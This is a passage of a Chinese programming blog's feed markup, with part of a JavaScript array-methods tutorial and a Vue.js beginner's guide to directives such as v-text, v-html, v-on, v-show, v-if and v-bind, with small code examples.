class="line"><span class="keyword">function</span> <span class="title function_">cp</span>(<span class="params">arr1,arr2</span>)&#123;</span><br><span class="line">  arr1.<span class="title function_">foreach</span>(<span class="function">(<span class="params">item,index</span>)=&gt;</span>&#123;</span><br><span class="line">    arr2[index] = item;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong><u>这种叫做深复制</u></strong>，将旧数组每一项的元素赋值到新数组上</p><h4 id="Access-function"><a href="#Access-function" class="headerlink" title="Access function"></a>Access function</h4><p>查找元素：</p><p><strong>indexOf()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> position = arr.<span class="title function_">indexOf</span>(<span class="string">&quot;b&quot;</span>);<span class="comment">//position为1</span></span><br><span class="line"><span class="keyword">let</span> position1 = arr.<span class="title function_">indexOf</span>(<span class="string">&quot;v&quot;</span>);<span class="comment">//position1位NAN</span></span><br></pre></td></tr></table></figure><p>如果数组中包含多个相同的元素，用indexOf()返回数组<u><strong>第一个值</strong></u>的索引</p><p><strong>lastIndexOf()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> position = arr.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;b&quot;</span>);<span class="comment">//position为2</span></span><br></pre></td></tr></table></figure><p>如果数组中包含多个相同的元素，用indexOf()返回数组<u><strong>最后一个值</strong></u>的索引</p><p>数组的字符串表示：</p><p><strong>join(),toString()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> name = [<span class="string">&quot;jack&quot;</span>,<span class="string">&quot;pack&quot;</span>,<span class="string">&quot;john&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> namestr = name.<span class="title function_">join</span>();</span><br><span class="line"><span class="keyword">let</span> namestr1 = name.<span class="title function_">toString</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(namestr)<span class="comment">//输出jack,pack,john</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(namestr1)<span class="comment">//输出jack,pack,john</span></span><br></pre></td></tr></table></figure><p>这两个方法都返回一个包含数组所有元素的字符串，各元素之间用逗号分隔开。</p><p>实际上，当直接对<u><strong>一个数组</strong></u>使用<u><strong>print()函数</strong></u>时，系统会自动调用哪个数组的toString()方法。</p><p>由已知数组创建新数组：</p><p><strong>concat()</strong>:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">let</span> arr2 = [<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>];</span><br><span class="line"><span class="keyword">let</span> newarr = arr.<span class="title function_">concat</span>(arr2);</span><br><span class="line"><span class="title function_">print</span>(newarr);<span class="comment">//输出1,2,3,4,5,6,7,8</span></span><br></pre></td></tr></table></figure><p>Array.concat(Array),作为参数的数组拼接在发起者的数组上</p><p><u><strong>splice()</strong></u>:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>,<span class="string">&quot;c&quot;</span>,<span class="string">&quot;d&quot;</span>];</span><br><span class="line"><span class="keyword">let</span> resultarr = arr.<span class="title function_">splice</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(resultarr)<span class="comment">//打印出[b,c]</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(arr)<span class="comment">//打印出[a,d]</span></span><br></pre></td></tr></table></figure><p>该方法第一个参数是截取的起始索引，第二个参数是截取的长度。</p><p>splice方法还可以用于增加或移除元素</p><p>增加元素：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>];</span><br><span class="line">nums.<span class="title function_">splice</span>(<span class="number">3</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>);<span class="comment">//第三个参数开始为增添的元素</span></span><br></pre></td></tr></table></figure><p>删除元素：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> nums = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">100</span>,<span class="number">200</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">4</span>,<span class="number">5</span>];</span><br><span class="line">nums.<span class="title function_">splice</span>(<span class="number">3</span>,<span class="number">4</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(numes);<span class="comment">//打印出1,2,3,4,5</span></span><br></pre></td></tr></table></figure><h4 id="The-variable-element："><a href="#The-variable-element：" class="headerlink" title="The variable element："></a>The variable element：</h4><p>添加元素:</p><p><strong>push()</strong>    从数组后面添加</p><p><strong>unshift()</strong>    从数组头添加</p><p>删除元素：</p><p><strong>pop()</strong>    从数组后面删除</p><p><strong>shift()</strong>    从数组头删除</p><p>本质上就是栈的操作</p><p>数组排序：</p><p><strong>reverse()</strong>    翻转数组元素顺序</p><p><strong>sort()</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> names = [<span class="string">&quot;David&quot;</span>,<span class="string">&quot;Mike&quot;</span>,<span class="string">&quot;Cynthia&quot;</span>,<span class="string">&quot;Clayton&quot;</span>,<span class="string">&quot;Bryan&quot;</span>,<span class="string">&quot;Raymond&quot;</span>];</span><br><span class="line">names.<span class="title function_">sort</span>();</span><br><span class="line"><span class="title function_">print</span>(names);<span class="comment">//Bryan,Clayton,Cynthia,David,Mike,Raymond</span></span><br></pre></td></tr></table></figure><p>sort()方法是按照字典顺序对元素进行排序的，因此它假定元素都是字符串类型。即使是Number类型也会转换成字符串类型在进行排序。对于数字的排序，会发生非常不友好的结果。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">11</span>,<span class="number">6</span>,<span class="number">100</span>,<span class="number">21</span>];</span><br><span class="line">arr.<span class="title function_">sort</span>();</span><br><span class="line"><span class="title function_">print</span>(arr);<span class="comment">//1,100,11,2,21,3,6</span></span><br></pre></td></tr></table></figure><p>就像上面一样，是按照字符串的字典顺序进行排序的，解决方法是通过sort传入一个大小比较函数解决排序问题</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">compare</span>(<span class="params">num1,num2</span>)&#123;</span><br><span class="line"><span class="keyword">return</span> num1-num2</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> nums = [<span class="number">3</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">100</span>,<span class="number">4</span>,<span class="number">200</span>];</span><br><span class="line">nums.<span class="title function_">sort</span>(compare);<span class="comment">//传入compare函数</span></span><br><span class="line"><span class="title function_">print</span>(nums);<span class="comment">//1,2,3,4,100,200</span></span><br></pre></td></tr></table></figure><h4 id="Lterator-method"><a href="#Lterator-method" class="headerlink" title="Lterator method"></a>Lterator method</h4><p>这些方法对数组中的每个元素应用一个函数，可以返回一个值、一组值或者一个新数组。</p><p>不生成新数组的迭代器方法：</p><p><strong>forEach()</strong>:</p><p>该方法接受一个函数作为参数，对数组中的每个元素使用该函数。</p>]]></content>
    
    
    <summary type="html">js的数据结构二:队列</summary>
    
    
    
    <category term="代码" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/"/>
    
    <category term="JavaScript" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/"/>
    
    <category term="算法" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/%E7%AE%97%E6%B3%95/"/>
    
    <category term="描述" scheme="https://www.scery.com/categories/%E4%BB%A3%E7%A0%81/JavaScript/%E7%AE%97%E6%B3%95/%E6%8F%8F%E8%BF%B0/"/>
    
    
    <category term="代码" scheme="https://www.scery.com/tags/%E4%BB%A3%E7%A0%81/"/>
    
    <category term="JavaScript" scheme="https://www.scery.com/tags/JavaScript/"/>
    
    <category term="算法" scheme="https://www.scery.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="描述" scheme="https://www.scery.com/tags/%E6%8F%8F%E8%BF%B0/"/>
    
  </entry>
  
  <entry>
    <title>vue_baselearning</title>
    <link href="https://www.scery.com/vue-baselearning.htm"/>
    <id>https://www.scery.com/vue-baselearning.htm</id>
    <published>2020-06-01T05:30:11.000Z</published>
    <updated>2024-03-18T02:51:00.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Vue基本入门知识点整理"><a href="#Vue基本入门知识点整理" class="headerlink" title="Vue基本入门知识点整理"></a>Vue基本入门知识点整理</h1><h2 id="Vue基本架构："><a href="#Vue基本架构：" class="headerlink" title="Vue基本架构："></a>Vue基本架构：</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  &#123;&#123;templete&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span><br><span class="line">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span><br><span class="line">  <span class="attr">data</span>:&#123;</span><br><span class="line">    <span class="attr">templete</span>:<span class="string">&quot;VUE&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">methods</span>:&#123;</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><blockquote><h3 id="el是绑定选中的元素的作用域，不可绑定在Html和body标签，里面可以绑定其他DOM元素，例如id-class-标签等，对应着-id，-class，标签等"><a href="#el是绑定选中的元素的作用域，不可绑定在Html和body标签，里面可以绑定其他DOM元素，例如id-class-标签等，对应着-id，-class，标签等" class="headerlink" title="el是绑定选中的元素的作用域，不可绑定在Html和body标签，里面可以绑定其他DOM元素，例如id,class,标签等，对应着#id，.class，标签等"></a>el是绑定选中的元素的作用域，<u>不可绑定在Html和body标签</u>，里面可以绑定其他DOM元素，例如<strong>id</strong>,<strong>class</strong>,<strong>标签</strong>等，对应着<strong>#id</strong>，<strong>.class</strong>，<strong>标签</strong>等</h3><h4 id="Vue在body里面定义的元素数据-用到的数据定义在data中-data中可以写复杂类型的数据，渲染复杂类型的数据时，遵守js的语法即可"><a href="#Vue在body里面定义的元素数据-用到的数据定义在data中-data中可以写复杂类型的数据，渲染复杂类型的数据时，遵守js的语法即可" class="headerlink" title="Vue在body里面定义的元素数据,用到的数据定义在data中,data中可以写复杂类型的数据，渲染复杂类型的数据时，遵守js的语法即可"></a>Vue在body里面定义的元素数据<strong></strong>,用到的数据定义在data中,data中可以写复杂类型的数据，渲染复杂类型的数据时，遵守js的语法即可</h4></blockquote><hr><h2 id="Vue函数："><a href="#Vue函数：" class="headerlink" title="Vue函数："></a>Vue函数：</h2><ul><li><h3 id="v-text"><a href="#v-text" class="headerlink" title="v-text"></a>v-text</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-text</span>=<span class="string">&quot;context_name+&#x27;lalala&#x27;&quot;</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>//输出“他在lalala”</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-text</span>=<span class="string">&quot;context_name&quot;</span>&gt;</span>呵呵呵<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>//输出“他在”</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>&#123;&#123;message&#125;&#125;咳咳咳<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>//输出“我在咳咳咳”</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">message</span>:<span class="string">&quot;我在&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">contex_name</span>:<span class="string">&quot;他在&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-text指令的作用是：设置标签的内容（textContent）"><a href="#v-text指令的作用是：设置标签的内容（textContent）" class="headerlink" title="v-text指令的作用是：设置标签的内容（textContent）"></a>v-text指令的作用是：设置标签的内容（textContent）</h3><h3 id="默认的写法会替换全部内容，使用差值表达式可以替换指定内容"><a href="#默认的写法会替换全部内容，使用差值表达式可以替换指定内容" class="headerlink" title="默认的写法会替换全部内容，使用差值表达式可以替换指定内容"></a>默认的写法会替换全部内容，使用差值表达式可以替换指定内容</h3><h3 id="内部支持写表达式"><a href="#内部支持写表达式" class="headerlink" title="内部支持写表达式"></a>内部支持写表达式</h3></blockquote><ul><li><h3 id="v-html"><a href="#v-html" class="headerlink" title="v-html"></a>v-html</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-html</span>=<span class="string">&quot;baidu&quot;</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>//输出一个普通文本字符</span><br><span class="line">  <span class="tag">&lt;<span class="name">h1</span> <span class="attr">v-html</span>=<span class="string">&quot;baiduurl&quot;</span>&gt;</span>哈哈哈<span class="tag">&lt;/<span class="name">h1</span>&gt;</span>//输出一个超链接字符</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">baidu</span>:<span class="string">&quot;百度&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">baiduurl</span>:<span class="string">&quot;&lt;a herf=&quot;</span><span class="attr">https</span>:<span class="comment">//www.baidu.com&quot;&gt;百度&lt;/a&gt;&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-html指令的作用是：设置元素的innerHTML"><a href="#v-html指令的作用是：设置元素的innerHTML" class="headerlink" title="v-html指令的作用是：设置元素的innerHTML"></a>v-html指令的作用是：设置元素的innerHTML</h3><h3 id="内容中有html结构会被解析为标签"><a href="#内容中有html结构会被解析为标签" class="headerlink" title="内容中有html结构会被解析为标签"></a>内容中有html结构会被解析为标签</h3><h3 id="而对于v-text，v-text指令无论内容是什么，都只会解析成文本"><a href="#而对于v-text，v-text指令无论内容是什么，都只会解析成文本" class="headerlink" title="而对于v-text，v-text指令无论内容是什么，都只会解析成文本"></a>而对于v-text，v-text指令无论内容是什么，都只会解析成文本</h3><h3 id="解析文本使用v-text，需要解析html结构使用v-html"><a href="#解析文本使用v-text，需要解析html结构使用v-html" class="headerlink" title="解析文本使用v-text，需要解析html结构使用v-html"></a>解析文本使用v-text，需要解析html结构使用v-html</h3></blockquote><ul><li><h3 id="v-on基础"><a href="#v-on基础" class="headerlink" title="v-on基础"></a>v-on基础</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;鼠标单击&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;do&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;鼠标移入&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;do&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;鼠标双击&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;do&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;鼠标双击简写&quot;</span> @<span class="attr">dblclick</span>=<span class="string">&quot;do&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> @<span class="attr">click</span>=<span class="string">&quot;changeword&quot;</span>&gt;</span>&#123;&#123;name&#125;&#125;<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">name</span>:<span class="string">&quot;小白&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;，</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">do</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&quot;你触发了&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">changeword</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">this</span>.<span class="property">name</span> += 小白</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-on指令的作用是：为元素绑定事件"><a href="#v-on指令的作用是：为元素绑定事件" class="headerlink" title="v-on指令的作用是：为元素绑定事件"></a>v-on指令的作用是：为元素绑定事件</h3><h3 id="事件名不需要写on"><a href="#事件名不需要写on" class="headerlink" title="事件名不需要写on"></a>事件名不需要写on</h3><h3 id="指令可以简写为"><a href="#指令可以简写为" class="headerlink" title="指令可以简写为@"></a>指令可以简写为@</h3><h3 id="绑定的方法定义在methods属性中"><a href="#绑定的方法定义在methods属性中" class="headerlink" title="绑定的方法定义在methods属性中"></a>绑定的方法定义在methods属性中</h3><h3 id="方法内部通过this关键字可以访问定义在data中数据"><a href="#方法内部通过this关键字可以访问定义在data中数据" class="headerlink" title="方法内部通过this关键字可以访问定义在data中数据"></a>方法内部通过this关键字可以访问定义在data中数据</h3></blockquote><ul><li><h3 id="v-show基础"><a href="#v-show基础" class="headerlink" title="v-show基础"></a>v-show基础</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;显示/隐藏文字&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;show&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-show</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>你看到我吗<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">isShow</span>:<span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    &#125;，</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">show</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">this</span>.<span class="property">isShow</span> = !<span class="variable language_">this</span>.<span class="property">isShow</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><h3 id="v-show指令的作用是：根据真假切换元素的显示状态"><a href="#v-show指令的作用是：根据真假切换元素的显示状态" class="headerlink" title="v-show指令的作用是：根据真假切换元素的显示状态"></a>v-show指令的作用是：根据真假切换元素的显示状态</h3><h3 id="原理是修改元素的disalay，实现显示隐藏"><a href="#原理是修改元素的disalay，实现显示隐藏" class="headerlink" title="原理是修改元素的disalay，实现显示隐藏"></a>原理是修改元素的disalay，实现显示隐藏</h3><h3 id="指令后面的内容，最终都会解析成布尔值"><a href="#指令后面的内容，最终都会解析成布尔值" class="headerlink" title="指令后面的内容，最终都会解析成布尔值"></a>指令后面的内容，最终都会解析成布尔值</h3><h3 id="值为true元素显示，值为false元素隐藏"><a href="#值为true元素显示，值为false元素隐藏" class="headerlink" title="值为true元素显示，值为false元素隐藏"></a>值为true元素显示，值为false元素隐藏</h3><h3 id="数据改变之后，对应元素的显示状态会同步更新"><a href="#数据改变之后，对应元素的显示状态会同步更新" class="headerlink" title="数据改变之后，对应元素的显示状态会同步更新"></a>数据改变之后，对应元素的显示状态会同步更新</h3></blockquote><ul><li><h3 id="v-if"><a href="#v-if" class="headerlink" title="v-if"></a>v-if</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;显示/隐藏文字&quot;</span> <span class="attr">v-on:click</span>=<span class="string">&quot;show&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">h2</span> <span class="attr">v-if</span>=<span class="string">&quot;isShow&quot;</span>&gt;</span>你看到我吗<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">isShow</span>:<span class="literal">true</span></span></span><br><span class="line"><span class="language-javascript">    &#125;，</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">show</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">this</span>.<span class="property">isShow</span> = !<span class="variable language_">this</span>.<span class="property">isShow</span>;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><blockquote><p>v-if指令的作用是：根据表达式的真假切换元素的显示状态</p><p>本质是通过操纵dom元素来切换显示状态</p><p>表达式的值为true，元素存在于dom树种，为false，从dom树中移除</p></blockquote><ul><li><h3 id="v-bind"><a href="#v-bind" class="headerlink" title="v-bind"></a>v-bind</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-class">.abc</span>&#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">border</span>: <span class="number">1px</span> solid red;</span></span><br><span class="line"><span class="language-css"> &#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;app&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> @<span class="attr">onclick</span>=<span class="string">&quot;show&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:src</span>=<span class="string">&quot;imgSrc&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:title</span>=<span class="string">&quot;imgtitle&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:class</span>=<span class="string">&quot;ifShowClass:&#x27;classname&#x27;:&#x27;&#x27;&quot;</span>&gt;</span>//三目运算符方式</span><br><span class="line">  <span class="tag">&lt;<span class="name">img</span> <span class="attr">v-bind:class</span>=<span class="string">&quot;&#123;classname:ifShowClass&#125;&quot;</span>&gt;</span>//对象方式</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">el</span>:<span class="string">&quot;#app&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">imgSrc</span>:<span class="string">&quot;./图片地址&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">imgtitle</span>:<span class="string">&quot;图片名称&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">ifShowClass</span>:<span class="literal">false</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">classname</span>:<span class="string">&quot;abc&quot;</span></span></span><br><span class="line"><span class="language-javascript">  &#125;,</span></span><br><span class="line"><span class="language-javascript">  <span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">show</span>:<span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">this</span>.<span class="property">ifShowClass</span> =!<span class="variable language_">this</span>.<span class="property">ifShowClass</span>; </span></span><br><span class="line"><span 